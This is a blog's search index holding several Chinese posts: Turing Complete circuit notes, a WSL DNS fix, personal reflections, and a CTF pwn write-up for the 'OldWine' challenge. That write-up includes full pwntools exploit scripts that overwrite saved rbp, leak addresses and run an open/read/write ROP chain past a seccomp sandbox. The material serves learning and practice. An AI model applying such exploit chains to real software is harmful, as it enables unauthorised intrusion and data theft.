<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Turing Complete——优雅存储&amp;小盒子</title>
    <link href="/post/turing-complete---elegant-storage-5yncu.html"/>
    <url>/post/turing-complete---elegant-storage-5yncu.html</url>
    
    <content type="html"><![CDATA[<h1 id="Turing-Complete——优雅存储-小盒子"><a href="#Turing-Complete——优雅存储-小盒子" class="headerlink" title="Turing Complete——优雅存储&amp;小盒子"></a>Turing Complete——优雅存储&amp;小盒子</h1><h2 id="优雅存储"><a href="#优雅存储" class="headerlink" title="优雅存储"></a>优雅存储</h2><p>这一关的电路结构非常的简单，但是当时一直没有打出来，主要是当时这种思想没理解到加上当时直觉上以为电路中不能形成回环，所以很久都没有搞出来。</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-09-09%20080359-20250909103402-62fsd3y.png" alt="屏幕截图 2025-09-09 080359">​</p><p>最后的电路就是这样，非常简单，思想也就是当不可以进行修改的时候，将之前的输出再次输出。就这样简单的一个电路结构，竟然就构成了一个存储器，往后计算机中极为重要的存储在最开始原来就是这样简单的电路。</p><p>但是，观察这一个电路的结构，就很容易发现，这里的存储方式是通过一直写入从而达到保存数据的目的，因此，当我们断掉电源之后，就将失去数据。这倒也确实很符合早期存储的现象，但是现如今的存储已经不会在因为断电而丢失信息，所以现在的存储器又是怎么构成的呢？</p><h3 id="一些满足好奇的了解"><a href="#一些满足好奇的了解" class="headerlink" title="一些满足好奇的了解"></a>一些满足好奇的了解</h3><p>经过一些搜索之后，专业上把之前提到的会因断电而丢失信息的存储称为易失性存储，而不会因断电而丢失信息的存储称为非易失性存储。现在的计算机也并没有放弃易失性存储，时至现在，我们的计算机都还存在着易失性存储。</p><p>简单了解了一下，一般非易失性存储的实现一般都是依靠的其物理特性，例如，在闪存中是存在一个浮栅用于困住电子以保存数据，或则依靠一些其他的物理特性。</p><p>在计算机中，一般易失性存储用于高速缓存，因为缓存的作用并不需要一直保存信息，它只作为一个信息的中转站，并且像SRAM和DRAM这类易失性存储的传输速度远远高于非易失性存储，所以我们现在其实仍然在使用易失性存储。</p><p>（只是简单搜索了解了一下，如果存在错误，请联系我修改）</p><h2 id="小盒子"><a href="#小盒子" class="headerlink" title="小盒子"></a>小盒子</h2><p>这一关挺简单的，就是有点恶心，因为限制了空间大小，导致我尝试了好多次都因为空间问题而失败。现在游戏没告诉我为什么这一关空间这么小，但是我怀疑是因为在实际环境下的硬件空间有限。</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250909114422-iesdff6.png" alt="image"></p><p>空间确实是很小了，实现的功能是指定地址读写，思路也很简单，设置好开关的接口后（上面黄线部分），让开关控制每一个寄存器是否可以读写，没什么逻辑难点，主要是布线麻烦，放上来存粹是为了展示一下这个我很满意的布线。</p><p>指定地址读写感觉也算是计算机里很重要的一个功能了，还是会感觉很惊讶一些感觉简单的线路最后竟然会造出功能如此强大的计算机。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>希望可以早日手搓出一台计算机</p>]]></content>
    
    
    <categories>
      
      <category>游戏</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Turing Complete</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对写blog的一些小思考</title>
    <link href="/post/some-thoughts-on-writing-blogs-27dawp.html"/>
    <url>/post/some-thoughts-on-writing-blogs-27dawp.html</url>
    
    <content type="html"><![CDATA[<h1 id="对写blog的一些小思考"><a href="#对写blog的一些小思考" class="headerlink" title="对写blog的一些小思考"></a>对写blog的一些小思考</h1><p>之前看到p神（phithon）写的blog，首先还是很佩服p神竟然能够连续写blog写十几年，其次就是看了大神的blog之后对自己的blog也有了一些反思。</p><p>‍</p><p>之前我一直感觉博客是拿来记录自己的学习进度的一个地方，然后每次就会特意去学一个知识点，然后写一篇博客去记录，但是往往坚持不了多久就写不下去了。因为对我来说感觉是有一点痛苦了，我是想要写一点不一样的东西出来的，但是当我打算开始学习一个知识点的时候，就会发现之前的师傅们总结的其实已经很好了，于是每当我学习完了一个知识点之后想要写一篇文章去总结的时候，写着写着就会发现我的文章不管是内容还是格式，和其他师傅写的文章重复率高达百分之五六十，这让我有一种在抄袭其他师傅文章的愧疚感。因此文章常常写不下去，或则写到一半就放弃了。</p><p>‍</p><p>所以我打算改变一下我的写作风格，打算把博客用来记录一下平时自己遇见的问题和思考，在记录一下自己感觉很有意思的事，比如之前遇到的那道芯片安全的题目，这是我目前为来第一次遇到这样的题目，虽然开始一点都看不懂，但是看了一天之后还是有一点了解了，后续我可能会写一篇复现；还有最近在玩的Turing Complete，感觉挺有意思，可能会把一些我感觉比较难的关卡写一篇文章中分享一下。</p><p>‍</p><p>最后，希望我的博客可以是我用来思考和分享快乐的地方，而不是在重复中感到痛苦的地方。</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>心得与体会</category>
      
    </categories>
    
    
    <tags>
      
      <tag>心得与体会</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wsl中ubuntu的DNS解析错误</title>
    <link href="/post/dns-resolution-error-for-ubuntu-in-wsl-1isudy.html"/>
    <url>/post/dns-resolution-error-for-ubuntu-in-wsl-1isudy.html</url>
    
    <content type="html"><![CDATA[<h1 id="wsl中ubuntu的DNS解析错误"><a href="#wsl中ubuntu的DNS解析错误" class="headerlink" title="wsl中ubuntu的DNS解析错误"></a>wsl中ubuntu的DNS解析错误</h1><h2 id="判断是否是dns解析错误"><a href="#判断是否是dns解析错误" class="headerlink" title="判断是否是dns解析错误"></a>判断是否是dns解析错误</h2><p>1.进入wsl ping <a href="http://www.baidu.com/">www.baidu.com</a> 不通；</p><p>2.本机cmd ping <a href="http://www.baidu.com/">www.baidu.com</a> 正常；</p><p>3.把本机ping 百度的ip拿出来，用wsl直接ping 百度的ip正常；</p><p>通过此步骤基本可以判断是WSL2默认的DNS配置有问题。</p><p>（出现这个的原因是是因为ubuntu自身的配置会每次将dns改为初始值）</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>创建&#x2F;etc&#x2F;wsl.conf，内容如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">[network]<br>generateResolvConf = <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>这是用于将ubuntu自己获取dns的配置关掉</p><p>退出 wsl，关机然后重新启动：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">exit</span><br>wsl <span class="hljs-comment">--shutdown</span><br>wsl<br></code></pre></td></tr></table></figure><p>删除 link 文件：<code>/etc/resolv.conf</code>​:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm /etc/resolv.conf<br></code></pre></td></tr></table></figure><p>然后新建 <code>/etc/resolv.conf</code>​ 文件，内容如下，可自定义 nameserver 地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">nameserver 8.8.8.8<br></code></pre></td></tr></table></figure><p>再次退出 wsl，关机然后重新启动：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">exit</span><br>wsl <span class="hljs-comment">--shutdown</span><br>wsl<br></code></pre></td></tr></table></figure><p>一般这样之后这个问题就会解决</p><p>但是我之前这样操作之后还是没有连上网</p><p>后来一篇文章中看到<a href="https://www.cnblogs.com/gatling/p/18113032">https://www.cnblogs.com/gatling/p/18113032</a></p><p>还需要将我们wsl上的网关信息也放在<code>/etc/resolv.conf</code>​</p><p>cat &#x2F;etc&#x2F;resolv.conf<br>nameserver 172.21.32.1（在路由中找到的网关信息)<br>nameserver 8.8.8.8<br>nameserver 8.8.4.4</p><h2 id="解决PLUS"><a href="#解决PLUS" class="headerlink" title="解决PLUS"></a>解决PLUS</h2><p>这个问题其实断断续续困扰了我将近半年了，这学期学完计网，终于是明白了了造成这个问题最根本的原因了，</p><p>在我的电脑上出现的问题是使用公共DNS，例如8.8.8.8，DNS仍然解析不成功，但是如我上述的解决方法，把在路由里找到的ip放进去就可以解析了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250720134332-f9jht0o.png" alt="image"></p><p>造成这个问题的原因我怀疑是，wsl作为虚拟机不能直接与外部的DNS相连，需要先经过我们的本机作为中转，先将我们需要解析的域名发给本机，让本机交给外部的DNS去解析，然后再返还给wsl。此时，如果我们的在<code>/etc/resolv.conf</code>​里面写nameserver 8.8.8.8，就会前往本机里面寻找8.8.8.8，找不到，自然也就解析不了。如果我们此时写的是192.168.31.1，就能够找到我们本机，让我们的本机在转发去寻找8.8.8.8，就能够解析成功。</p><p>但是现在还存在一个问题，就是如果我们连接的wifi更换了的话，那个在图中我们圈起来的ip也是会变化的，此时我们就需要在<code>/etc/resolv.conf</code>​更换我们的内容为更新后的ip，但是每换一次网络就得更换ip太过复杂，所以可以写一个自动化的脚本在我们每次启动wsl的时候自动更新DNS</p><p>以下解决方案需要windows11，wsl2并开启了systemd特性</p><p>可以使用以下命令查看是否具有systemed，出现systemd就是存在</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">ps -p 1 -o <span class="hljs-built_in">comm</span>=<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250720163204-j5cpatz.png" alt="image"></p><p>然后使用以下命令查看是否启用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl list-units<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250720163743-8opx1if.png" alt="image"></p><p>这样应该就是启用了的，可以开始配置了，如果没有启用，就还需要开启</p><h3 id="如何启用-systemd（如果未开启）"><a href="#如何启用-systemd（如果未开启）" class="headerlink" title="如何启用 systemd（如果未开启）"></a>如何启用 systemd（如果未开启）</h3><p>修改 WSL 的配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> nano /etc/wsl.conf<br></code></pre></td></tr></table></figure><p>添加以下内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[boot]</span><br><span class="hljs-attr">systemd</span>=<span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>保存并退出，再重新启动</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wsl <span class="hljs-literal">--shutdown</span><br></code></pre></td></tr></table></figure><h3 id="自动写入"><a href="#自动写入" class="headerlink" title="自动写入"></a>自动写入</h3><p>以下是我自动写入的shell脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br>gw=$(ip route | grep default | awk <span class="hljs-string">&#x27;&#123;print $3&#125;&#x27;</span>)<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nameserver <span class="hljs-variable">$gw</span>&quot;</span> &gt; /etc/resolv.conf<br></code></pre></td></tr></table></figure><p>创建<code>/usr/local/bin/update-wsl-dns</code>​然后写入我们的脚本，然后再给文件权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chmod</span> +x /usr/local/bin/update-wsl-dns<br></code></pre></td></tr></table></figure><p>创建<code>/etc/systemd/system/update-wsl-dns.service</code>​，写入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sh">[Unit]<br>Description=Update WSL DNS from Windows Gateway<br>After=network-online.target<br>Wants=network-online.target<br><br>[Service]<br>Type=oneshot<br>ExecStart=/usr/local/bin/update-wsl-dns<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>然后执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">sudo</span> systemctl daemon-reexec<br><span class="hljs-built_in">sudo</span> systemctl daemon-reload<br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> update-wsl-dns.service<br><span class="hljs-built_in">sudo</span> systemctl start update-wsl-dns.service<br></code></pre></td></tr></table></figure><p>这样，在每次启动wsl的时候就可以自动写入dns而不需要自己每次都手动写入了，如果发现dns失效，重启一下wsl或则执行<code>sudo update-wsl-dns</code>​就可以解决</p><p>‍</p><p>‍</p><p>前半段的解决是在去年寒假写的，这学期学完计网之后了解了问题原因写了解决plus，其实我的计网学的也不好，只有期末突击了一下，所以要是问题原因解释的不对，希望师傅们可以留言告诉我一下。</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>环境问题</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>碎碎念</title>
    <link href="/post/silent-thoughts-zrtgyp.html"/>
    <url>/post/silent-thoughts-zrtgyp.html</url>
    
    <content type="html"><![CDATA[<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>这么偏的blog，应该也没什么人看，就写一些碎给自己看吧</p><p>昨天看了一位师傅的bolg，感觉差距真的也算是挺大的，那个师傅在刚学四个月的时候就开始思考关于pwn的实战攻击了，而自己却一直局限在ctf里面，而且相较于那位师傅自己学得也太慢了，这些真的需要好好反思反思了，所以写一篇感悟警醒一下自己。</p><p>不想当黑客的pwner不是一个好的pwner，当初也是因为感觉pwn很帅选择学的pwn，但是可能是因为在一些比赛里面拿了一些奖吧，感觉反而更去最求得奖了，学习新技术的时间也越来越少，反而去研究该怎么把题目做出来。现在突然感觉自己停滞了好久，现在自己已经大二下了，但是堆的高版本利用方法还不会，之前计划以后学的内核，iot，windows pwn都还遥遥无期，感觉自己离自己那个黑客梦越来越远了。</p><hr><p>没想到这周这么忙（周四刚回学校，周五惊觉自己还有六级），还以为自己能写完呢，其实剩下两个弄了一半了，但是文章还没怎么写，虽然没写完，但是我还是觉得这个周报，挺有用的，比如这周我这么忙的情况下，要是没有我自己立下的flag，我可能都不怎么会学了，但现在，虽然没有全部干完，也还是干了一半多的，所以我觉得还是挺有用的。</p><p>然后就是，当时xia0ji233师傅看见了我写的这一篇blog，就过来和我聊了一下（应该是单方面给我说，因为我太i了不敢说话），给了我一些建议，所以真的很庆幸当时加入了nepnep，遇见了xia0ji233师傅，给我学习了路上很多的引导和鼓励</p><hr><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>心得与体会</category>
      
    </categories>
    
    
    <tags>
      
      <tag>心得与体会</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>京麒——OldWine</title>
    <link href="/post/kyoki--oldwine-1yet2t.html"/>
    <url>/post/kyoki--oldwine-1yet2t.html</url>
    
    <content type="html"><![CDATA[<h1 id="京麒——OldWine"><a href="#京麒——OldWine" class="headerlink" title="京麒——OldWine"></a>京麒——OldWine</h1><p>不会打，太坐牢了，只能复现了qwq(没想到时间拖了这么久）</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>开了一个沙箱，把execve禁了</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526153633-39ylc9y.png" alt="image"></p><p>然后权限限制得很死</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526153755-doma7u3.png" alt="image"></p><p>也不给我们可以用的寄存器</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154040-e2qwd8o.png" alt="image"></p><p>在程序中给了我们两个选项</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154219-m5yqkfg.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154245-yuxzkzi.png" alt="image"></p><p>1是可以向栈上写东西</p><p>如果输入2，就会调用一次leave然后回到菜单处</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154534-8b6j5cu.png" alt="image"></p><p>众所周知</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">leave = mov esp, ebp<br>pop ebp<br></code></pre></td></tr></table></figure><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我当时没有思路，看了wp之后，发现师傅们都是修改bp的后两位，使bp位于sp前</p><p>终于，经过我不懈的调试，终于懂了这道题目该怎么做了</p><p>首先这道题目一定得先链接出题人给的libc库，我开始使用的自己的库（开始还以为做栈上的题影响不大呢，看来自己见识的还是太少了），调试的时候rbp里面存放的值是1，导致我一直不知道其他师傅的wp里面写的覆盖rbp后两位然后让rbp位于rsp之前是怎么做到的</p><p>这是使用的我自己的库</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-27%20151452-20250528105710-v2vpyol.png" alt="屏幕截图 2025-05-27 151452"></p><p>这是使用出题人给的库</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-27%20165814-20250528105643-dhr6zrw.png" alt="屏幕截图 2025-05-27 165814"></p><p>可以看到rbp里面放的东西完全不一样（但是为什么不同的库会导致rbp里面的值不一样我还不知道，要是有师傅知道，可以留言告诉我一下吗）</p><p>然后我们之后就可以通过溢出使old_rbp的后两位覆盖为00，使得有一定机率之后让rbp小于等于rsp</p><p>然后我们进入到read函数里面，可以看到</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131133-qis17gi.png" alt="image"></p><p>执行完read函数返回时，只用了<code>ret=pop rip</code>​,所以返回地址现在是放在rsp里面的</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131356-l3ywzid.png" alt="image"></p><p>然后，我们看一下在调用read函数之前的寄存器</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131822-sso042c.png" alt="image"></p><p>我们看到，rsi寄存器(写入数据的地址)里面放的是<code>[rbp-0x10]+rcx</code>​，此时因为我们把rbp放到了rsp的前面，就可以通过read的溢出覆盖到rsp，而rsp里面存放的是返回地址，此时就算我们不知道程序中的具体位置，也可以覆盖返回地址后两位跳转到write进行泄露</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528132518-9qs9mu1.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250605151132-tboxdhh.png" alt="image"></p><p>可以看到已经泄露出来东西了</p><p>本来后续想用栈迁移写的，但是不知道为什么栈迁移不稳定的因素太多了，很难调试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">io.sendline(b<span class="hljs-string">&#x27;64&#x27;</span>)<br>     io.sendlineafter(b<span class="hljs-string">&#x27;index: &#x27;</span>,b<span class="hljs-string">&#x27;16&#x27;</span>)<br>     io.send(p64(start+<span class="hljs-number">0x4300</span>))<span class="hljs-meta">#rsp=start+0x4300</span><br>     leave()<br>     <br>     cmd1(<span class="hljs-number">8</span>,<span class="hljs-number">16</span>,p64(start+<span class="hljs-number">0x4100</span>))<span class="hljs-meta">#rbp=start+0x4100</span><br>     leave()<br>     <br>     payload=b<span class="hljs-number">&#x27;f</span>lag<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;+b&#x27;</span>\x00&#x27;<br>     payload+=p64(start+<span class="hljs-number">0x14f5</span>)<br>     <br>     payload+=p64(rdi)+p64(start+<span class="hljs-number">0x40f8</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">0x2</span>)+p64(syscall)<span class="hljs-meta">#open</span><br>     payload+=p64(rdi)+p64(<span class="hljs-number">0x3</span>)+p64(rsi)+p64(start+<span class="hljs-number">0x4400</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<span class="hljs-meta">#read</span><br>     payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(start+<span class="hljs-number">0x4400</span>)+p64(rax)+p64(<span class="hljs-number">0x1</span>)+p64(syscall)<span class="hljs-meta">#write</span><br>     <br>     cmd1(len(payload),<span class="hljs-number">8</span>,payload)<br>     <br>    <br>     cmd1(<span class="hljs-number">8</span>,<span class="hljs-number">0x210</span>,p64(start+<span class="hljs-number">0x4101</span>))<br>     <br>     print(<span class="hljs-string">&#x27;where is my flag&#x27;</span>)<br>     <br>     pause()<br></code></pre></td></tr></table></figure><p>本来是这么写的，但是问题很多，栈迁移在一些情况下bp里面的值会被覆盖导致栈迁移失败，然后有一次到了我写的payload位置，但是不知道为什么，卡着动不了了，实在是不想调这个了，所以打算换一种方法写</p><p>于是我看了一下，可以泄露出栈上面的一个地址，然后已知rbp的值末尾一定为00，如果我们把我们泄露出的栈上末尾改为00，相当于我们就获得了rbp的地址（这里的输出名字改了一下，原来的stack输出的其实是起始地址，现在的stack才是真正的栈上地址）</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607141359-9i1c9ib.png" alt="image"></p><p>可以看到我们获得了rbp的地址，所以我们就可以把flag输入到栈上，然后由于我们循环进来的i让我们覆盖到了位于rsp的返回地址上，此时，我们再输入<code>cmd1(8,8*i,payload)</code>​就可以把payload放到返回地址上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import*<br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br><br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>def cmd(cmd):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;2. stack pivoting\n&#x27;</span>,str(cmd))<br>    <br>def cmd1(size,index,con):<br>    cmd(<span class="hljs-number">1</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;size: &#x27;</span>,str(size))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;index: &#x27;</span>,str(index))<br>    io.send(con)<br>    <br>def leave():<br>    cmd(<span class="hljs-number">2</span>)<br>    <br><br>cmd1(<span class="hljs-number">1</span>,<span class="hljs-number">16</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>leave()<br><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">2</span>,<span class="hljs-number">30</span>):<br>    cmd1(<span class="hljs-number">0x20</span>,i*<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x45&#x27;</span>)<br>    data=io.recv(<span class="hljs-number">0x18</span>).strip()<br>    print(<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>,data)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;stack&#x27;</span> not in data:<br>        data1=data[:<span class="hljs-number">16</span>]<br>        start=u64(data1[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>        glibc=u64(data1[<span class="hljs-number">-8</span>:])<br>        <span class="hljs-built_in">stack</span>=u64(data[<span class="hljs-number">-8</span>:])&amp; ~<span class="hljs-number">0xff</span><br>        print(<span class="hljs-string">&#x27;stack:&#x27;</span>,hex(<span class="hljs-built_in">stack</span>))<br>        print(<span class="hljs-string">&#x27;glibc&#x27;</span>,hex(glibc))<br>        print(<span class="hljs-string">&#x27;start:&#x27;</span>,hex(start))<br>        libc_base=glibc-(<span class="hljs-number">0x7f24e43751ca</span><span class="hljs-number">-0x7f24e434b000</span>)<br>        start=start<span class="hljs-number">-0x144f</span><br>        <br>        bss=start+<span class="hljs-number">0x4200</span><br>        <span class="hljs-meta"># gdb.attach(io)</span><br>        io.recv()<br>        rdi=libc_base+<span class="hljs-number">0x000000000010f75b</span><br>        rsi=libc_base+<span class="hljs-number">0x0000000000110a4d</span><br>        rax=libc_base+<span class="hljs-number">0x00000000000dd237</span><br>        syscall=libc_base+<span class="hljs-number">0x0000000000012725b</span><br>        io.sendline(b<span class="hljs-string">&#x27;20&#x27;</span>)<br>        io.sendlineafter(b<span class="hljs-string">&#x27;index: &#x27;</span>,b<span class="hljs-string">&#x27;8&#x27;</span>)<br>        <span class="hljs-meta"># gdb.attach(io)</span><br>        io.send(b<span class="hljs-number">&#x27;f</span>lag<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;*4)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        payload=p64(rdi)+p64(stack-0x8)+p64(rsi)+p64(0)+p64(rax)+p64(0x2)+p64(syscall)#open</span><br><span class="hljs-string">        payload+=p64(rdi)+p64(0x3)+p64(rsi)+p64(bss)+p64(rax)+p64(0)+p64(syscall)#read</span><br><span class="hljs-string">        payload+=p64(rdi)+p64(1)+p64(rsi)+p64(bss)+p64(rax)+p64(0x1)+p64(syscall)#write</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        cmd1(len(payload),8*i,payload)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        io.interactive()</span><br><span class="hljs-string">        </span><br><span class="hljs-string"></span><br><span class="hljs-string">io.interactive()</span><br></code></pre></td></tr></table></figure><p>我本来把b’flag’的字符放在rbp上的，但是不知道为什么，会被覆盖，但是放在rbp-8处就不会被覆盖</p><p>让后还有一个问题，我使用syscall后不会跳回来（使用<code>ROPgadget --binary pwn --only &#39;syscall&#39;</code>​找到的syscall就不会返回，</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607143507-38g6br7.png" alt="image"></p><p>没办法，我直接进libc.so.6里面找的可以返回的syscall</p><p>太不容易了，终于调出来了(这个环境总把我写的东西覆盖掉qwq)</p><p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607131017-7l4hgn6.png" alt="image"></p>]]></content>
    
    
    <categories>
      
      <category>刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>2025京麒</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HITCON CTF —— setjmp</title>
    <link href="/post/hitcon-ctf------setjmp-xgw6m.html"/>
    <url>/post/hitcon-ctf------setjmp-xgw6m.html</url>
    
